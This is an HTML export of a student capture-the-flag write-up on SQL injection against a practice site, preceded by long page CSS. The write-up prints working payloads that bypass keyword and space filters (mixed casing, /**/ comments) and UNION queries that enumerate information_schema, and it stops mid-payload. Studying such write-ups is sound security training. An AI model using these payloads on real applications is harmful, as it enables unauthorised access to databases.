@@ -1,0 +1,745 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>SQL Injection</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="b25ae718-a6f1-46e8-8d98-32690e82bb2d" class="page sans"><header><h1 class="page-title">SQL Injection</h1></header><div class="page-body"><p id="f6266a22-a5bd-42ba-ae66-cdd6943d539a" class=""><a href="https://dev.mysql.com/doc/refman/8.0/en/">https://dev.mysql.com/doc/refman/8.0/en/</a></p><p id="83445714-6f87-4f44-8ae4-cee52b94d684" class=""><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p><p id="08849063-c6f5-4bec-b87e-739897bb8d4e" class=""><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection">https://book.hacktricks.xyz/pentesting-web/sql-injection</a></p><p id="cd37c608-f443-46e9-a89c-fb2b00d918d0" class=""><a href="https://null-byte.wonderhowto.com/how-to/sql-injection-101-avoid-detection-bypass-defenses-0184918/">https://null-byte.wonderhowto.com/how-to/sql-injection-101-avoid-detection-bypass-defenses-0184918/</a></p><p id="2e8aa3b0-1daa-4fb0-9112-a8e40785626d" class="">
+</p><p id="69c85eac-059e-4ab5-bc20-16f007292365" class=""><a href="https://constellations.hackthe.space/">https://constellations.hackthe.space/</a></p><p id="abf794eb-a75b-469c-a181-246cd54bfe6f" class="">
+</p><h1 id="2581efd4-28bc-43f8-afd8-51b2655e7403" class="">Constellations Markdown- 11912007</h1><h2 id="3bcdda77-bbc9-432d-b81f-cb3f0ed00ff1" class="">Team</h2><p id="9df29b77-3561-449c-ba8e-9eb66a90cacf" class="">For this challenge I worked with:</p><ul id="88d76cc6-b34c-427d-ae67-e41e5418b9fa" class="bulleted-list"><li style="list-style-type:disc">Johannes Zottele - 11911133</li></ul><ul id="6e644a5a-4b94-4122-876a-81dd38629108" class="bulleted-list"><li style="list-style-type:disc">Johanna Wolfsberg - 11916452</li></ul><p id="6923cb38-9d94-4301-9fb8-37609115cf0e" class="">
+</p><h2 id="f999ddab-be44-43d6-b9c9-93c3b0127093" class="">Overview </h2><p id="346cecd1-e090-491b-9763-830f84b88dc2" class="">The website <a href="https://constellations.hackthe.space/">https://constellations.hackthe.space/</a> serves as a space database and is accessible without a VPN. It asks for a password and the abbreviation of a star and can also display a complete list of all the stars in the database.</p><p id="518be687-88c0-4f69-b3d6-f1a048353c95" class="">
+</p><h2 id="b60e87a5-22fe-43df-839b-9d398c107cc0" class="">Vulnerability</h2><h3 id="243c38dd-6ccc-499f-9b1e-c2b3ac61c25a" class="">The Password Input </h3><p id="51ebb361-a576-4ced-b2dd-16fe354fb65d" class="">Probably not a SQL query or at least not useful to us because we were not able to recieve any SQL errors.</p><h3 id="abb32fe2-a168-4143-9934-2e0ea58ff609" class="">Abbreviation Search Input </h3><p id="005ae7ab-f9b8-4d11-904b-99709f28de7b" class="">After playing around with the database search functionality and causing different errors for a while it turns out, that my input is part of a search query send to a mySQL data database.</p><p id="949e41df-362d-49c3-9de9-aec1a3ca5fde" class="">The query probably looks something like this:</p><pre id="63b35cde-c3ee-4c97-9b8b-3b3218cea2d1" class="code"><code>SELECT Name, Abbreviation, Origin, Brightest_Star as Brightest Star
+FROM Constellation WHERE Abbreviation = &#x27;$_POST[&quot;input&quot;]&#x27; LIMIT 1;</code></pre><ul id="6dc9c76e-aaf7-4477-9977-30fd522932f0" class="bulleted-list"><li style="list-style-type:disc">case insensitive</li></ul><ul id="ae2b0222-ddb8-4777-8f8b-ff63678f4330" class="bulleted-list"><li style="list-style-type:disc">limits to only one result with <code>&quot; .  $_GET[&quot;search&quot;] . &quot; &#x27; LIMIT 1</code></li></ul><ul id="30c22af7-8afa-4db3-b96b-1274f53f64a7" class="bulleted-list"><li style="list-style-type:disc">Whitelisted approaches but no prepared statements. Not allowed:<ul id="6464b236-73df-483b-ba70-b8ea70cadb75" class="bulleted-list"><li style="list-style-type:circle">Spaces → can be bypassed by using tabs or SQL comments <code>/**/</code></li></ul><ul id="8f1c74e7-0247-4372-ae01-5df7c03c2236" class="bulleted-list"><li style="list-style-type:circle">Comments <code>--</code>, <code>#</code> </li></ul><ul id="062b5d81-097b-41a2-b249-912423e799ce" class="bulleted-list"><li style="list-style-type:circle">specific words like <code>UNION</code> or <code>SELECT</code> get removed → can be bypassed by using a mixed casing: i.e. <code>uNiOn</code><p id="460c9e3e-bce0-4169-8677-a45c530f55b1" class="">Alternatively one could decode some encoded entries, but its less efficient and does not always work as expected.<div class="indented"><ol type="1" id="612e3ef4-823d-40be-ab4c-eae959333161" class="numbered-list" start="1"><li>URL → doesnt work</li></ol><ol type="1" id="18993ee6-ebfa-46b9-b2ab-e102f92e85e3" class="numbered-list" start="2"><li>Hex → UNHEX(&#x27;2D2D20&#x27;)</li></ol><ol type="1" id="bdcb90ef-a556-4a9f-8998-7ca4fe1309b0" class="numbered-list" start="3"><li>character → CHAR(45,45,30)</li></ol><p id="4b96648c-2853-489e-bc7b-a172b57c9f70" class="">
+</p></div></p></li></ul></li></ul><h2 id="9c92d916-b730-4769-9575-15196763a74e" class="">Preperation</h2><p id="97d533b8-6c1b-468a-b46d-cad1648a7434" class="">First we wrote a simple HTML file to make writing payloads easier:</p><pre id="1d8f5627-3dd9-4992-9099-47e74f21ce3c" class="code"><code>&lt;body&gt;
+    &lt;textarea type=&quot;text&quot; id=&quot;input&quot;&gt;&lt;/textarea&gt;
+    &lt;p id=&quot;output&quot; style=&quot;width: 500px;&quot;&gt;&lt;/p&gt;
+    &lt;script&gt;
+        const out = document.getElementById(&quot;output&quot;);
+
+        const input = document.getElementById(&quot;input&quot;).addEventListener(&#x27;change&#x27;, function() {
+            out.innerText = this.value.replace(/ /g, &quot;/**/&quot;);
+        })
+        
+    &lt;/script&gt;
+&lt;/body&gt;</code></pre><p id="9ebfbb9d-86b8-429e-848a-d6e655cc2787" class="">
+</p><h2 id="f470c4e9-ceaf-4bf9-821d-980d68fd36fd" class="">Exploitation</h2><h3 id="38deddb8-5446-4702-8f79-ff0449d13015" class="">Step 1</h3><p id="2607ef42-6f20-4644-a036-36e3c909124f" class="">We first wanted to figure out whether there are elements in this table hidden from us.</p><p id="edb3b549-bc8b-400e-9798-694c10913015" class="">For that we thought of using the <code>LIMIT X OFFSET Y</code> query command but it wasn&#x27;t possible because we can not comment <code>LIMIT</code> out of the existing query.</p><p id="57d08116-3f17-4f61-9b48-77bb28e62161" class="">We were therefore forced to remove each table row / item individually.</p><pre id="11bb7dee-f292-44f3-9889-394e87f86cba" class="code"><code>&#x27;OR(Abbreviation/**/LIKE/**/&#x27;%&#x27;AND/**/NOT/**/Abbreviation=&#x27;And&#x27;AND/**/NOT/**/Abbreviation=&#x27;CMa&#x27;AND/**/NOT/**/Abbreviation=&#x27;Cep&#x27;AND/**/NOT/**/Abbreviation=&#x27;Hyi&#x27;AND/**/NOT/**/Abbreviation=&#x27;Lup&#x27;AND/**/NOT/**/Abbreviation=&#x27;Men&#x27;AND/**/NOT/**/Abbreviation=&#x27;Sgr&#x27;AND/**/NOT/**/Abbreviation=&#x27;UMa&#x27;AND/**/NOT/**/Abbreviation=&#x27;Vul&#x27;)OR/**/Abbreviation=&#x27;</code></pre><p id="a1296b31-a4fd-4ecc-8109-e59bc1d9cfdd" class="">turned into</p><pre id="141a3d92-4cbf-433a-9ad0-5d16f5ff5045" class="code"><code>SELECT Name, Abbreviation, Origin, Brightest_Star as Brightest Star
+FROM Constellation WHERE Abbreviation = &#x27;&#x27;
+OR (Abbreviation LIKE &#x27;%&#x27;
+AND NOT Abbreviation=&#x27;And&#x27;
+AND NOT Abbreviation=&#x27;CMa&#x27;
+AND NOT Abbreviation=&#x27;Cep&#x27;
+AND NOT Abbreviation=&#x27;Hyi&#x27;
+AND NOT Abbreviation=&#x27;Lup&#x27;
+AND NOT Abbreviation=&#x27;Men&#x27;
+AND NOT Abbreviation=&#x27;Sgr&#x27;
+AND NOT Abbreviation=&#x27;UMa&#x27;
+AND NOT Abbreviation=&#x27;Vul&#x27;)
+OR Abbreviation=&#x27;&#x27; LIMIT 1; -- to also see empty strings</code></pre><p id="f639e458-3038-4f9f-a839-276e46dbb356" class="">We got nothing back.</p><p id="487e9ce2-1d14-40ac-8843-811e29c5ffd3" class="">At this point it was clear that this table had no hidden secrets.</p><p id="97ee5421-854e-486e-bc3a-ab8a5d664bef" class="">
+</p><h3 id="0d23e0c8-150c-4b88-a25d-c286d2ac9a37" class="">Step 2</h3><p id="982792cb-8a72-4f01-9fc2-97bfb316619c" class="">Then we tried to figure a way out to get all the names of other table names by accessing metadata:</p><pre id="13833808-36bb-4a0d-b6f8-e262c65a37c7" class="code"><code>&#x27;/**/UnION/**/SeLECT/**/table_name,2,3,4/**/FRoM/**/information_schema.tables/**/WHeRE&#x27;1&#x27;=&#x27;1</code></pre><p id="d253d1ef-9785-4b6e-be37-02c2087de336" class="">turned into</p><pre id="59fd519a-3cf1-41ba-93cd-b9ebabca9ce4" class="code"><code>SELECT Name, Abbreviation, Origin, Brightest_Star as Brightest Star
+FROM Constellation WHERE Abbreviation = &#x27;&#x27;
+UNION SELECT table_name,2,3,4 FROM information_schema.tables 
+WHERE &#x27;1&#x27;=&#x27;1&#x27; LIMIT 1;</code></pre><p id="c423c4ba-0c76-4452-9f4c-f579b604ada1" class="">and it was successful:</p><pre id="11b3fb4a-87a7-477b-8b47-284d5c860aa8" class="code"><code>Name	           Abbreviation	  Origin   Brightest Star
+CHARACTER_SETS	 2           	  3	       4</code></pre><p id="b0d8e0de-534f-4fea-a405-85716800e03c" class="">So we also tried it to get all the column names from <code>CHARACTER_SETS</code> like so:</p><pre id="9c014aed-95fe-4dbb-b3cb-9518a7624575" class="code"><code>&#x27;/**/UnION/**/SeLECT/**/column_name,2,3,4/**/FRoM/**/information_schema.columns/**/WHeRE(table_name)=&#x27;CHARACTER_SETS</code></pre><pre id="66ee9b27-8091-4c56-ae64-a460333c9c57" class="code"><code>SELECT Name, Abbreviation, Origin, Brightest_Star as Brightest Star
+FROM Constellation WHERE Abbreviation = &#x27;&#x27;
+UNION SELECT column_name,2,3,4 FROM information_schema.columns
+WHERE (table_name)=&#x27;CHARACTER_SETS&#x27; LIMIT 1;</code></pre><p id="405bb514-a3f7-4b0c-9607-eb04f167e698" class="">and were once again successful in doing so:</p><pre id="10f2ad57-41b2-47df-a62c-8f4de988f39f" class="code"><code>Name	               Abbreviation	  Origin   Brightest Star
+CHARACTER_SETS_NAME	 2           	  3	       4</code></pre><p id="9c224acc-6527-4df1-b2d3-999ffb819775" class="">
+</p><h3 id="31691992-5c5a-41cc-ba3f-c69fa9d90471" class="">Step 3</h3><p id="700b1828-a25e-48ee-bfa6-fa8a6c5f3834" class="">At this point we were able to access <em>all </em>the tables and their columns in their database through the exclusion of the known elements:</p><pre id="3ad3c8c8-3e8b-44c4-bfe5-181d0a718d1e" class="code"><code>&#x27;/**/UnION/**/Select/**/table_name,table_schema,3,4/**/From/**/information_schema.tables/**/Where/**/NOT/**/table_name/**/=/**/&#x27;CHARACTER_SETS&#x27;/**/AND/**/NOT/**/table_name/**/=/**/&#x27;COLLATIONS&#x27;/**/AND/**/NOT/**/table_name/**/=/**/&#x27;COLLATION_CHARACTER_SET_APPLICABILITY&#x27;/**/AND/**/NOT/**/table_name/**/=/**/&#x27;COLUMNS&#x27;/**/AND/**/NOT/**/table_name/**/=/**/&#x27;COLUMN_PRIVILEGES&#x27;/**/AND/**/NOT/**/table_name/**/=/**/&#x27;ENGINES&#x27;/**/AND/**/NOT/**/table_name/**/=/**/&#x27;EVENTS&#x27;/**/AND/**/NOT/**/table_name/**/=/**/&#x27;FILES&#x27;/**/AND/**/NOT/**/table_name/**/=/**/&#x27;GLOBAL_STATUS&#x27;/**/AND/**/NOT/**/table_name/**/=/**/&#x27;GLOBAL_VARIABLES</code></pre><pre id="db247812-3a16-4359-9d0a-64e22fef72a7" class="code"><code>SELECT Name, Abbreviation, Origin, Brightest_Star as Brightest Star
+FROM Constellation WHERE Abbreviation = &#x27;&#x27;
+UNION SELECT table_name,2,3,4 FROM information_schema.tables
+WHERE NOT table_name = &#x27;CHARACTER_SETS&#x27;
+AND NOT table_name = &#x27;COLLATIONS&#x27;
+AND NOT table_name = &#x27;COLLATION_CHARACTER_SET_APPLICABILITY&#x27;
+AND NOT table_name = &#x27;COLUMNS&#x27;
+AND NOT table_name = &#x27;COLUMN_PRIVILEGES&#x27;
+AND NOT table_name = &#x27;ENGINES&#x27;
+AND NOT table_name = &#x27;EVENTS&#x27;
+AND NOT table_name = &#x27;FILES&#x27;
+AND NOT table_name = &#x27;GLOBAL_STATUS&#x27;
+AND NOT table_name = &#x27;GLOBAL_VARIABLES&#x27;
+AND NOT table_name = &#x27;ENGINES&#x27;
+AND NOT table_name = &#x27;ENGINES&#x27;
